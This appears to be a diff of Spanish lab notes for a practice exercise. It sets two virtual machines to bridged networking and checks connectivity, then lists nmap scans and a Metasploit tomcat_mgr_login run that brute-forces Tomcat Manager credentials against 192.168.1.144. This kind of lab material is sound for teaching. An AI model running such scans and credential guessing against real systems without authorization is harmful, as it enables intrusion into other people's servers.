@@ -2,15 +2,25 @@ Cambiar el adaptador de red de las dos máquinas a adaptador puente y comprobar 
 máquinas y el 8.8.8.8.
 
 nmap -sV ip_red/mascara_red
+
 nmap -A ip_maquina/mascara_maquina
+
 msfconsole
+
 search tomcat_mgr_login
+
 use auxiliary/scanner/http/tomcat_mgr_login
+
 show options --> Centrarse en RHOSTS(víctima) y RPORT
+
 set rhosts 192.168.1.144
+
 run
+
 set user_as_pass true
+
 set username tomcat
+
 run
 
 
@@ -20,7 +30,6 @@ Esto permite que las máquinas virtuales se conecten directamente a la red físi
 de la red local.
 
 -Comprobar el ping entre las máquinas y 8.8.8.8:
-
 Ejecutar el comando ping desde cada máquina virtual para verificar la conectividad a Internet al intentar 
 comunicarse con la dirección IP 8.8.8.8 (servidores de Google). Para verificar si las máquinas pueden enviar 
 paquetes a través de la red.
